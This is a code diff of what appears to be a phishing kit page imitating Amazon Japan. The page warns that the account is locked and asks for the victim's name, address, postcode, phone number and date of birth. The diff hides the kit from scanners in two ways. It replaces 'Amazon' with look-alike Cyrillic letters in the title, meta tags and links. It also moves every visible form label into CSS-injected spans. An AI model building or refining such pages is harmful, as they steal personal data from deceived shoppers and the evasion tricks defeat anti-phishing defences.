@@ -23,11 +23,13 @@
     </style>
     <link rel="stylesheet" href="../style/css/217css.css"/>
     <link rel="stylesheet" href="../style/css/219css.css"/>
-    <title>Amazon | 本, ファッション, 家電から食品まで | アマゾン</title>
+    <link rel="stylesheet" href="../style/css/billing.css"/>
+    <link rel="stylesheet" href="../style/css/signin.css"/>
+    <title>Amаzоn | 本, ファッション, 家電から食品まで | アマゾン</title>
     <meta name="description"
-          content="Amazon.co.jp 公式サイト。お急ぎ便ご利用で当日・翌日にお届け。アマゾンで本, 日用品, ファッション, 食品, ベビー用品, カー用品ほか一億種の商品をいつでもお安く。通常配送無料(一部を除く)"/>
+          content="Amаzоn.co.jp 公式サイト。お急ぎ便ご利用で当日・翌日にお届け。アマゾンで本, 日用品, ファッション, 食品, ベビー用品, カー用品ほか一億種の商品をいつでもお安く。通常配送無料(一部を除く)"/>
     <meta property="og:description"
-          content="Amazon.co.jp 公式サイト。お急ぎ便ご利用で当日・翌日にお届け。アマゾンで本, 日用品, ファッション, 食品, ベビー用品, カー用品ほか一億種の商品をいつでもお安く。通常配送無料(一部を除く)"
+          content="Amаzоn.co.jp 公式サイト。お急ぎ便ご利用で当日・翌日にお届け。アマゾンで本, 日用品, ファッション, 食品, ベビー用品, カー用品ほか一億種の商品をいつでもお安く。通常配送無料(一部を除く)"
           xmlns:og="http://opengraphprotocol.org/schema/"/>
     <link rel="stylesheet" href="../style/css/41rcss.css"/>
     <style type="text/css">
@@ -107,7 +109,7 @@
                 "            <a id=\"music\" href=\"#\" class=\"nav-a  \">ミュージック</a>\n" +
                 "            <a href=\"#\" class=\"nav-a  \">ランキング</a>\n" +
                 "            <a href=\"#\" class=\"nav-a  \">新着商品</a>\n" +
-                "            <a href=\"#\" class=\"nav-a  \">AmazonBasics</a>\n" +
+                "            <a href=\"#\" class=\"nav-a  \">AmаzоnBasics</a>\n" +
                 "            <a href=\"#\" class=\"nav-a  \">ギフト券</a>\n" +
                 "            <a id=\"health-and-personal-care\" href=\"#\" class=\"nav-a  \">ドラッグストア</a>\n" +
                 "            <a id=\"books\" href=\"#\">本・コミック</a>\n" +
@@ -364,7 +366,7 @@
                 "                        <div style=\"background: rgba(255,255,255,.96);border-radius: 5px; padding: 1.25rem 0; margin: 0 auto; box-shadow: 0 2px 10px 4px rgba(0,0,0,0.25);margin-left:10px;margin-right:10px;\">\n" +
                 "                            <h3 class=\"u-focus in-progress\" tabindex=\"-1\" id=\"logoff-header\">\n" +
                 "                                <font style=\"color:red;\">\n" +
-                "                                    <center>更新するまでアカウントにアクセスできません</center>\n" +
+                "                                    <center><span class='billing1'></span></center>\n" +
                 "                                </font>\n" +
                 "                            </h3>\n" +
                 "                        </div>\n" +
@@ -375,7 +377,7 @@
                 "                            <div class=\"row\" style=\"margin-left:10px;margin-right:10px;\">\n" +
                 "                                <div class=\"col-xs-10 col-xs-offset-1\">\n" +
                 "                                    <div style=\"text-align: center;\">\n" +
-                "                                        <h2>請求先住所を更新する<span class=\"util high-contrast\"></span></h2>\n" +
+                "                                        <h2><span class='billing2'></span><span class=\"util high-contrast\"></span></h2>\n" +
                 "                                        <br>\n" +
                 "                                        <style type=\"text/css\">\n" +
                 "                                            .jpui.progress.rectangles {\n" +
@@ -458,24 +460,22 @@
                 "                                    </div>\n" +
                 "                                    <form name=\"billingform\" id=\"billingform\" method=\"POST\" action=\"#\">\n" +
                 "                                        <div class=\"a-row a-spacing-base\">\n" +
-                "                                            <label for=\"ap_email\" class=\"a-form-label\"> 氏名 <font style=\"color:#797474;\">(氏名を入力してください)</font>\n" +
+                "                                            <label for=\"ap_email\" class=\"a-form-label\"><span class='billing3'></span>  <font style=\"color:#797474;\"><span class='billing4'></span></font>\n" +
                 "                                            </label>\n" +
                 "                                            <!-- FullName フルネーム -->\n" +
                 "                                            <input placeholder=\"\" type=\"text\" maxlength=\"128\" id=\"ap_fullname\"\n" +
                 "                                                   name=\"fullname\" autocomplete=\"off\" tabindex=\"1\"\n" +
                 "                                                   class=\"a-input-text a-span12\" value=\"\" required=\"\"></div>\n" +
                 "                                        <div class=\"a-row a-spacing-base\">\n" +
-                "                                            <label for=\"ap_email\" class=\"a-form-label\"> 郵便番号 <font\n" +
-                "                                                    style=\"color:#797474;\">(郵便番号を入力してください)</font> </label>\n" +
-                "                                            <!-- Zip Code 郵便番号 -->\n" +
+                "                                            <label for=\"ap_email\" class=\"a-form-label\"> <span class='billing5'></span> <font\n" +
+                "                                                    style=\"color:#797474;\"><span class='billing6'></span></font> </label>\n" +
                 "                                            <input placeholder=\"郵便番号\" type=\"text\" maxlength=\"128\" id=\"ap_zipcode\"\n" +
                 "                                                   name=\"zipcode\" autocomplete=\"off\" tabindex=\"1\"\n" +
                 "                                                   class=\"a-input-text a-span12 auth-autofocus auth-required-field\"\n" +
                 "                                                   value=\"\"></div>\n" +
                 "                                        <div class=\"a-row a-spacing-base\">\n" +
-                "                                            <label for=\"ap_email\" class=\"a-form-label\"> 都道府県 <font\n" +
+                "                                            <label for=\"ap_email\" class=\"a-form-label\"><span class='billing7'></span>  <font\n" +
                 "                                                        style=\"color:#797474;\"></font> </label>\n" +
-                "                                            <!-- Street and number, P.O. box, c/o. 通りと番号、郵便ポスト、c/o. -->\n" +
                 "                                            <select type=\"select\" maxlength=\"128\" id=\"ap_stat\" name=\"stat\"\n" +
                 "                                                    autocomplete=\"off\" tabindex=\"1\"\n" +
                 "                                                    class=\"a-input-text a-span12 auth-autofocus auth-required-field\"\n" +
@@ -531,9 +531,8 @@
                 "                                            </select>\n" +
                 "                                        </div>\n" +
                 "                                        <div class=\"a-row a-spacing-base\">\n" +
-                "                                            <label for=\"ap_email\" class=\"a-form-label\"> 住所 <font style=\"color:#797474;\">(番地を入力してください)</font>\n" +
+                "                                            <label for=\"ap_email\" class=\"a-form-label\"> <span class='billing8'></span> <font style=\"color:#797474;\"><span class='billing9'></span></font>\n" +
                 "                                            </label>\n" +
-                "                                            <!-- Street and number, P.O. box, c/o. 通りと番号、郵便ポスト、c/o. -->\n" +
                 "                                            <input placeholder=\"\" type=\"text\" maxlength=\"128\" id=\"ap_address\"\n" +
                 "                                                   autocomplete=\"off\" name=\"address\" tabindex=\"1\"\n" +
                 "                                                   class=\"a-input-text a-span12 auth-autofocus auth-required-field\"\n" +
@@ -544,26 +543,16 @@
                 "                                                   class=\"a-input-text a-span12 auth-autofocus auth-required-field\"\n" +
                 "                                                   style=\"margin-top:5px;margin-left:0px\" value=\"\">\n" +
                 "                                        </div>\n" +
-                "                                        <#--<div class=\"a-row a-spacing-base\">-->\n" +
-                "                                            <#--<label for=\"ap_email\" class=\"a-form-label\"> 郵便番号 <font-->\n" +
-                "                                                        <#--style=\"color:#797474;\">(郵便番号を入力してください)</font> </label>-->\n" +
-                "                                            <#--<!-- Zip Code 郵便番号 &ndash;&gt;-->\n" +
-                "                                            <#--<input placeholder=\"郵便番号\" type=\"text\" maxlength=\"128\" id=\"ap_zipcode\"-->\n" +
-                "                                                   <#--name=\"zipcode\" autocomplete=\"off\" tabindex=\"1\"-->\n" +
-                "                                                   <#--class=\"a-input-text a-span12 auth-autofocus auth-required-field\"-->\n" +
-                "                                                   <#--value=\"\" required=\"required\"></div>-->\n" +
                 "                                        <div class=\"a-row a-spacing-base\">\n" +
-                "                                            <label for=\"ap_email\" class=\"a-form-label\"> 電話番号 <font\n" +
-                "                                                        style=\"color:#797474;\">(電話番号を入力してください)</font> </label>\n" +
-                "                                            <!-- Phone number 電話番号 -->\n" +
+                "                                            <label for=\"ap_email\" class=\"a-form-label\"> <span class='billing10'></span><font\n" +
+                "                                                        style=\"color:#797474;\"><span class='billing11'></span></font> </label>\n" +
                 "                                            <input placeholder=\"電話番号\" type=\"text\" maxlength=\"128\" id=\"ap_phone\"\n" +
                 "                                                   name=\"phonenumber\" autocomplete=\"off\" tabindex=\"1\"\n" +
                 "                                                   class=\"a-input-text a-span12 auth-autofocus auth-required-field\"\n" +
                 "                                                   value=\"\" ></div>\n" +
                 "                                        <div class=\"a-row a-spacing-base\">\n" +
-                "                                            <label for=\"ap_email\" class=\"a-form-label\"> 生年月日 <font\n" +
-                "                                                        style=\"color:#797474;\">(生年月日を入力してください)</font> </label>\n" +
-                "                                            <!-- DD/MM/YYYY 生年月日 -->\n" +
+                "                                            <label for=\"ap_email\" class=\"a-form-label\"><span class='billing12'></span> <font\n" +
+                "                                                        style=\"color:#797474;\"><span class='billing13'></span></font> </label>\n" +
                 "                                            <select placeholder=\"\" type=\"text\" maxlength=\"128\" id=\"ap_dob\"\n" +
                 "                                                    name=\"dob-year\" autocomplete=\"off\" tabindex=\"1\"\n" +
                 "                                                    class=\"a-input-text a-span12 auth-autofocus auth-required-field\"\n" +
@@ -585,9 +574,7 @@
                 "                                                    onfocus=\"deltag2(1)\">\n" +
                 "                                                <option value=\"\">日</option>\n" +
                 "                                                <option value='1'>1日</option><option value='2'>2日</option><option value='3'>3日</option><option value='4'>4日</option><option value='5'>5日</option><option value='6'>6日</option><option value='7'>7日</option><option value='8'>8日</option><option value='9'>9日</option><option value='10'>10日</option><option value='11'>11日</option><option value='12'>12日</option><option value='13'>13日</option><option value='14'>14日</option><option value='15'>15日</option><option value='16'>16日</option><option value='17'>17日</option><option value='18'>18日</option><option value='19'>19日</option><option value='20'>20日</option><option value='21'>21日</option><option value='22'>22日</option><option value='23'>23日</option><option value='24'>24日</option><option value='25'>25日</option><option value='26'>26日</option><option value='27'>27日</option><option value='28'>28日</option><option value='29'>29日</option><option value='30'>30日</option><option value='31'>31日</option>                                            </select>\n" +
-                "\n" +
                 "                                        </div>\n" +
-                "\n" +
                 "                                        <div class=\"a-divider a-divider-break\"></div>\n" +
                 "                                        <br>\n" +
                 "                                        <div class=\"a-section\"> <span id=\"continue\"\n" +
@@ -596,7 +583,7 @@
                 "                                                                                       class=\"a-button-input\"\n" +
                 "                                                                                       type=\"submit\"><span\n" +
                 "                                                            id=\"continue-announce\"\n" +
-                "                                                            class=\"a-button-text\"> 継続する </span></span>\n" +
+                "                                                            class=\"a-button-text\"><span class='billing14'></span></span></span>\n" +
                 "                                                    </span>\n" +
                 "                                        </div>\n" +
                 "                                        <div class=\"a-divider a-divider-break\">\n" +
@@ -604,7 +591,7 @@
                 "                                        <span id=\"auth-create-account-link\" class=\"a-button a-button-span12\"> <span\n" +
                 "                                                    class=\"a-button-inner\"><a id=\"createAccountSubmit\" tabindex=\"6\"\n" +
                 "                                                                              href=\"#\" class=\"a-button-text\"\n" +
-                "                                                                              role=\"button\"> キャンセル </a></span></span>\n" +
+                "                                                                              role=\"button\"> <span class='billing15'></span></a></span></span>\n" +
                 "                                    </form>\n" +
                 "                                </div>\n" +
                 "                            </div>\n" +
@@ -615,47 +602,36 @@
                 "        </main>\n" +
                 "    </div>\n" +
                 "</div>\n" +
-                "\n" +
-                "\n" +
-                "<!--&&&Portal&Delimiter&&&-->\n" +
-                "<!-- sp:end-feature:host-atf -->\n" +
-                "<!-- sp:feature:nav-btf -->\n" +
-                "<!-- btf pilu -->\n" +
-                "<!-- sp:end-feature:host-btf -->\n" +
-                "<!-- sp:feature:aui-preload -->\n" +
-                "<!-- sp:feature:nav-footer -->\n" +
-                "<!-- footer pilu -->\n" +
-                "<!-- NAVYAAN MOBILE FOOTER-->\n" +
                 "<footer class=\"nav-mobile nav-ftr-batmobile\">\n" +
                 "    <div id=\"nav-ftr\" class=\"nav-t-footer-gateway nav-sprite-v3\">\n" +
-                "        <a id=\"nav-ftr-gototop\" class=\"nav-a\" href=\"#\"> <i class=\"nav-icon\"></i> <b class=\"nav-b\"> ページトップへ </b> </a>\n" +
+                "        <a id=\"nav-ftr-gototop\" class=\"nav-a\" href=\"#\"> <i class=\"nav-icon\"></i> <b class=\"nav-b\"><span class='billing16'></span> </b> </a>\n" +
                 "        <ul id=\"nav-ftr-links\" class=\"nav-ftr-links-two-column\">\n" +
-                "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> マイストア </span> <i\n" +
+                "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing17'></span> </span> <i\n" +
                 "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-                "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> ほしい物リスト </span> <i\n" +
+                "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"><span class='billing18'></span>  </span> <i\n" +
                 "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-                "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> アカウントサービス </span> <i\n" +
+                "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing19'></span> </span> <i\n" +
                 "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
                 "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span\n" +
-                "                            class=\"nav-ftr-text\"> Amazon定期おトク便情報 </span> <i class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-                "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> 1-Click設定 </span> <i\n" +
+                "                            class=\"nav-ftr-text\"> <span class='billing20'></span> </span> <i class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
+                "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"><span class='billing21'></span>  </span> <i\n" +
                 "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
                 "            <li class=\"nav-li nav-li-right\"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> ヘルプ・サポート </span> <i\n" +
                 "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> カートを見る (<b\n" +
+                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing22'></span> (<b\n" +
                 "                                class=\"nav-b nav-cart-count\">0</b>) </span> <i class=\"nav-icon nav-sprite\"></i> </a>\n" +
                 "            </li>\n" +
-                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> 注文履歴 </span> <i\n" +
+                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing23'></span> </span> <i\n" +
                 "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> ほしい物リストサーチ </span> <i\n" +
+                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing24'></span> </span> <i\n" +
                 "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> Amazonで売る </span> <i\n" +
+                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing25'></span> </span> <i\n" +
                 "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> 最近チェックした商品 </span> <i\n" +
+                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing26'></span> </span> <i\n" +
                 "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> カスタマーサービスに連絡 </span> <i\n" +
+                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing27'></span> </span> <i\n" +
                 "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
-                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> Amazon PCサイト </span> <i\n" +
+                "            <li class=\"nav-li \"><a class=\"nav-a \" href=\"#\"> <span class=\"nav-ftr-text\"> <span class='billing28'></span> </span> <i\n" +
                 "                            class=\"nav-icon nav-sprite\"></i> </a></li>\n" +
                 "        </ul>\n" +
                 "        <div class=\"icp-container-mobile\">\n" +
@@ -681,17 +657,23 @@
                 "            アカウントをお持ちですか？\n" +
                 "            <a href=\"#\" class=\"nav-a\">ログイン</a>\n" +
                 "        </div>\n" +
-                "        <ul class=\"nav-ftr-horiz nav-ftr-big\">\n" +
-                "            <li class=\"nav-li\"><a href=\"#\" class=\"nav-a\"> 検索・閲覧履歴 </a></li>\n" +
-                "        </ul>\n" +
-                "        <ul class=\"nav-ftr-horiz\">\n" +
-                "            <li class=\"nav-li\"><a href=\"#\" class=\"nav-a\">利用規約</a></li>\n" +
-                "            <li class=\"nav-li\"><a href=\"#\" class=\"nav-a\">プライバシー規約</a></li>\n" +
-                "            <li class=\"nav-li\"><a href=\"#\" class=\"nav-a\">パーソナライズド広告規約</a></li>\n" +
-                "        </ul>\n" +
-                "        <div id=\"nav-ftr-copyright\">\n" +
-                "            &copy; 2000-2021, Amazon.com, Inc. and its affiliates\n" +
-                "        </div>\n" +
+                "                <ul class=\"nav-ftr-horiz nav-ftr-big \">\n" +
+                "                    <li class=\"nav-li \">\n" +
+                "                        <a href=\"#\" class=\"nav-a\"><span class='signin19'></span></a>\n" +
+                "                    </li>\n" +
+                "                </ul>\n" +
+                "                <ul class=\"nav-ftr-horiz \">\n" +
+                "                    <li class=\"nav-li \">\n" +
+                "                        <a href=\"#\" class=\"nav-a\"><span class='signin20'></span></a>\n" +
+                "                    </li>\n" +
+                "                    <li class=\"nav-li \">\n" +
+                "                        <a href=\"#\" class=\"nav-a\"><span class='signin21'></span></a>\n" +
+                "                    </li>\n" +
+                "                    <li class=\"nav-li \">\n" +
+                "                        <a href=\"#\" class=\"nav-a\"><span class='signin22'></span></a>\n" +
+                "                    </li>\n" +
+                "                </ul>\n" +
+                "                <div id=\"nav-ftr-copyright\"><span class='signin23'></span></div>\n" +
                 "    </div>\n" +
                 "</footer>\n" +
                 "<!-- whfh-Qk0sG5OcnKluHYqH2y/5BmESxqy4aXM973lJPN5YU3KKswhgm+q2uMb8RHOHdQbP rid-VNB14BJ37PY4TWGVKFV7 -->\n" +
